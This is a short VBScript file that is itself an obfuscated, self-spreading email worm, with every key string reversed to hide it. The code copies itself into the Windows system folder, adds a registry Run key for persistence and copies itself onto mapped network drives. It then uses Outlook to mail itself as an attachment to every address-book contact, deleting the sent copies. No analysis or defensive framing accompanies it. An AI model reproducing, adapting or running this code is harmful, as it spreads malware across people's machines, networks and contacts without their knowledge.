' asfd

On Error Resume Next

Dim G8HH
Dim VTIK2
Dim BO8TLB
Dim DUY
Dim F3E2GX7
Dim R2X5
Dim HGQPW
Dim GNP1
Dim QHZ0B6
Dim S9VMFR

Set G8HH = CreateObject( AIOIK( "tcejbOmetsySeliF.gnitpircS" ) )
G8HH.CopyFile WScript.ScriptFullName, G8HH.BuildPath( G8HH.GetSpecialFolder(1), AIOIK( "SBV.GK20BR" ) )

Set VTIK2 = CreateObject( AIOIK( "llehS.tpircSW" ) )
VTIK2.RegWrite AIOIK( "\nuR\noisreVtnerruC\swodniW\tfosorciM\erawtfoS\ENIHCAM_LACOL_YEKH" ) & AIOIK( "GK20BR" ), G8HH.BuildPath( G8HH.GetSpecialFolder(1), AIOIK( "SBV.GK20BR" ) )


Set BO8TLB = CreateObject( AIOIK( "krowteN.tpircSW" ) )
Set F3E2GX7 = BO8TLB.EnumNetworkDrives

If F3E2GX7.Count <> 0 Then
   For DUY = 0 To F3E2GX7.Count - 1
       If InStr( F3E2GX7.Item( DUY), AIOIK( "\" ) ) <> 0 Then
          G8HH.CopyFile WScript.ScriptFullName, G8HH.BuildPath( F3E2GX7.Item( DUY), AIOIK( "SBV.GK20BR" ) ) 
       End If
   Next
End If

DUY = VTIK2.RegRead( AIOIK( "\ENIHCAM_LACOL_YEKH" ) & AIOIK( "GK20BR" ) )

If DUY = "" Or DUY > 20 Then
   DUY = 0
End If

If DUY = 0 Then
   Set GNP1 = CreateObject( AIOIK( "noitacilppA.kooltuO" ) )
   Set R2X5 = GNP1.GetNameSpace( AIOIK( "IPAM" ) )

   For Each HGQPW In R2X5.AddressLists
       Set F3E2GX7 = GNP1.CreateItem( 0 )

       For QHZ0B6 = 1 To HGQPW.AddressEntries.Count
           Set S9VMFR = HGQPW.AddressEntries( QHZ0B6 )

           If QHZ0B6 = 1 Then
              F3E2GX7.BCC = S9VMFR.Address
           Else
              F3E2GX7.BCC = F3E2GX7.BCC & AIOIK( " ;" ) & S9VMFR.Address
           End If
       Next

       F3E2GX7.Subject = AIOIK( "SDA" )
       F3E2GX7.Body = AIOIK( "FDSAFDASFDFDSA" )
       F3E2GX7.Attachmets.Add WScript.ScriptFullName
       F3E2GX7.DeleteAfterSubmit = True
       F3E2GX7.Send
   Next

   DUY = 0
End If

VTIK2.RegWrite AIOIK( "\ENIHCAM_LACOL_YEKH" ) & AIOIK( "GK20BR" ), DUY + 1

Function AIOIK( NB9JD )
   Dim MHI44SFM
   Dim WQO
   Dim HWV

   MHI44SFM = ""

   For WQO = 1 To Len( NB9JD )
       HWV = Mid( NB9JD, WQO, 1 )

       MHI44SFM = HWV & MHI44SFM
   Next

   AIOIK = MHI44SFM
End Function
